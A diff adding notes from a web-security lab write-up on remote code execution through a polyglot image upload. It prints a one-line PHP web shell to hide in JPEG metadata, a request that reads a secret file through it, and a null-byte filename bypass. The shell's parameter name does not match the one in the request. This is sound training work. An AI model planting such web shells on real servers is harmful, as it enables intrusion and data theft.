@@ -85,3 +85,23 @@ Appproch : use the null method exploit.php%00.jpg
 
 ---
 
+# LAB : Remote code execution via polyglot web shell upload 
+
+Goal : vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code. 
+
+Approch : 
+
+after jpg image metadata add our payload which is  
+```php
+<?php system($_GET['akash']); ?>
+```
+
+after that  on the files/avatar/image.php?evil=cat+/home/carlos/secret 
+this will lead us to the secreat key 
+
+`WE can also do this with the exiftool but i am getting issue like the polygot (php+png file) which is created but not able to upload that file getting error after uploading 403 forbidden.`
+
+so i used this approch GPT suggested it get a RCE and find the secret file not bad approch though. 
+
+---
+
